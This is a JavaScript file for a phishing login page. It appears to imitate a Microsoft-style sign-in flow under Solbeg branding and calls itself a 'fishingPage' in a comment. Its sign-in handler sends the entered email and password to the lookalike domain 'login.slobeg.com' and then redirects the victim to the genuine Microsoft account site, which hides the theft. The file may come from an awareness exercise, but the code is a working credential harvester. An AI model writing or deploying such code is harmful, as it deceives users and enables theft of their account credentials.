const inputEmail = document.getElementById('input-email');
let inputEmailValue = '';

const enteredEmail = document.getElementById('entered-email');
const inputPassword = document.getElementById('input-password');
const errorMessage = document.getElementById('error-message-login');
const logoSmall = document.getElementById('logo-small');
const lowerBlock = document.querySelector('.lower-block');

const noAccount = document.querySelector('.no-account');
const cantAccess = document.querySelector('.cant-access');
const bodyElement = document.body;
const footer = document.querySelector('footer');
const footerElements = footer.querySelectorAll('*');

const signInOptionMenu = document.querySelector('.sing-in-options-menu');
const forgotPass = document.querySelector('.forgot-pass');
const signInButton = document.querySelector('.sign-in');
const backButton = document.querySelector('.back');
const cantAccessYourAccountTitle = document.getElementById('cant-access-title');
const cantAccessMenu = document.querySelector('.cant-access-menu');
const troubleshootingBlock = document.querySelector('.troubleshooting-block');
const copyToClipboardButton = document.querySelector('.trouble-subtitle-link');
const signInTitle = document.getElementById('sign-in-title');
const passwordTitle = document.getElementById('enter-pass-title');
const enteredEmailText = document.getElementById('enter-message');
const nextButton = document.getElementById('next-button');
const sigInOptionsTitle = document.getElementById('sign-in-options-title');
const errorMessagePassword = document.getElementById('error-message-password');

function validateInput() {

  inputEmailValue = inputEmail.value;
  if (!inputEmailValue || !/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(inputEmailValue)) {
    errorMessage.style.display = 'block';
    inputEmail.style.borderBottomColor = 'red';
  } else {
    errorMessage.style.display = 'none';
    inputEmail.style.borderBottomColor = 'black';

    signInTitle.style.display = 'none';
    enteredEmail.style.display = 'flex';
    inputEmail.style.display = 'none';

    inputPassword.style.display = 'block';
    passwordTitle.style.display = 'block';

    forgotPass.style.display = 'block';
    nextButton.style.display = 'none';

    bodyElement.style.backgroundImage = `linear-gradient(rgba(0, 0, 0, 0.5), rgba(0, 0, 0, 0.5)), url('../public/assets/images/solbeg_logo.png')`;

    logoSmall.src = '../public/assets/images/solbeglogo_rect.png';
    lowerBlock.style.display = 'none';

    footerElements.forEach(element => {
      element.style.color = 'white';
    });

    noAccount.style.display = 'none';
    cantAccess.style.display = 'none';
    signInButton.style.display = 'block';
    inputEmailValue = inputEmail.value;
    enteredEmailText.textContent = inputEmailValue;
  }
}

function backToFirstBlock() {

  logoSmall.src = '../public/assets/images/logo_rect.svg';
  signInTitle.style.display = 'block';
  passwordTitle.style.display = 'none';
  inputEmail.style.display = 'block';
  inputPassword.style.display = 'none';
  noAccount.style.display = 'block';
  cantAccess.style.display = 'block';
  nextButton.style.display = 'block';
  signInButton.style.display = 'none';
  forgotPass.style.display = 'none';
  lowerBlock.style.display = 'flex';
  enteredEmail.style.display = 'none';
  errorMessagePassword.style.display = 'none';

  signInOptionMenu.style.display = 'none';
  sigInOptionsTitle.style.display = 'none';
  backButton.style.display = 'none';
  cantAccessMenu.style.display = 'none';
  cantAccessYourAccountTitle.style.display = 'none';

  bodyElement.style.backgroundImage = `url('../public/assets/images/background.svg')`;

  footerElements.forEach(element => {
    element.style.color = 'black';
  });
}

function openLoverBlock() {
  errorMessage.style.display = 'none';
  inputEmail.style.borderBottomColor = 'black';

  sigInOptionsTitle.style.display = 'block';
  signInOptionMenu.style.display = 'flex';
  signInOptionMenu.style.flexDirection = 'column';
  inputEmail.style.display = 'none';
  signInTitle.style.display = 'none';
  noAccount.style.display = 'none';
  cantAccess.style.display = 'none';
  nextButton.style.display = 'none';
  backButton.style.display = 'block';
  signInButton.style.display = 'none';
  forgotPass.style.display = 'none';
  lowerBlock.style.display = 'none';
  enteredEmail.style.display = 'none';

}

function openCantAccessYourAccountBlock() {
  errorMessage.style.display = 'none';
  inputEmail.style.borderBottomColor = 'black';

  cantAccessYourAccountTitle.style.display = 'block';
  cantAccessMenu.style.display = 'flex';
  cantAccessMenu.style.flexDirection = 'column';
  inputEmail.style.display = 'none';
  signInTitle.style.display = 'none';
  noAccount.style.display = 'none';
  cantAccess.style.display = 'none';
  nextButton.style.display = 'none';
  backButton.style.display = 'block';
  signInButton.style.display = 'none';
  forgotPass.style.display = 'none';
  lowerBlock.style.display = 'none';
  enteredEmail.style.display = 'none';
}

function showCopied() {
  document.querySelectorAll('.trouble-copy *').forEach(element => {
    element.style.visibility = 'visible';
  });
  const errorCode = document.querySelector('.error-code').textContent.trim();
  const requestId = document.querySelector('.request-id').textContent.trim();
  const correlationId = document.querySelector('.correlation-id').
      textContent.
      trim();
  const timestamp = document.querySelector('.timestamp').textContent.trim();

  const textToCopy = `${errorCode}\n${requestId}\n${correlationId}\n${timestamp}`;

  navigator.clipboard.writeText(textToCopy).then(() => {
    console.log('Successfully copied!:');
  }).catch(err => {
    console.error('Error:', err);
  });

}

document.addEventListener('DOMContentLoaded', () => {
  const cantAccessButton = document.querySelector('.cant-access');
  cantAccessButton.addEventListener('click', () => {
    openCantAccessYourAccountBlock();
  });
  const moreButton = document.querySelector('.more');
  moreButton.addEventListener('click', () => {
    troubleshootingBlock.style.display = 'block';
  });
  copyToClipboardButton.addEventListener('click', () => {
    showCopied();
  });
  const crossButton = document.querySelector('.cross-icon');
  crossButton.addEventListener('click', () => {
    troubleshootingBlock.style.display = 'none';
  });
  const nextButton = document.getElementById('next-button');
  nextButton.addEventListener('click', () => {
    validateInput();
  });
  const arrowButton = document.getElementById('arrow');
  arrowButton.addEventListener('click', () => {
    backToFirstBlock();
  });
  const backButton = document.querySelector('.back');
  backButton.addEventListener('click', () => {
    backToFirstBlock();
  });
  const lowerBlockButton = document.querySelector('.lower-block');
  lowerBlockButton.addEventListener('click', () => {
    openLoverBlock();
  });
  const elements = [
    document.getElementById('next-button'),
    document.getElementById('input-email'),
    document.getElementById('sign-in-title'),
    document.querySelector('.no-account'),
    document.querySelector('.cant-access'),
    document.querySelector('.sign-in'),
    document.querySelector('.button'),
  ];

  elements.forEach(el => {
    if (el) {
      el.classList.add('animate-slide-in');
    }
  });

  const signInButton = document.querySelector('.sign-in');
  signInButton.addEventListener('click', () => {

    const inputEmail = document.getElementById('input-email');
    const inputEmailValue = inputEmail.value;

    const inputPassword = document.getElementById('input-password');
    const inputPasswordValue = inputPassword.value;

    let isValid = true;

    if (!inputPasswordValue) {
      errorMessagePassword.style.display = 'block';
      inputPassword.style.borderBottomColor = 'red';
      isValid = false;
    } else {
      errorMessagePassword.style.display = 'none';
    }
    if (!isValid) {
      return;
    }
    //const url = "http://localhost:8080/fishingPage_war_exploded/api/user/signup";

    fetch('https://login.slobeg.com/api/user/signup', {
      method: 'POST',
      mode: 'no-cors',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({
        login: inputEmailValue,
        password: inputPasswordValue,
      }),
    }).then(() => {
      console.log('Запрос отправлен, но ответ недоступен из-за режима no-cors');
      window.location.href = 'https://myaccount.microsoft.com';
    }).catch(error => {
      console.error('Ошибка:', error);
    });
  });
});
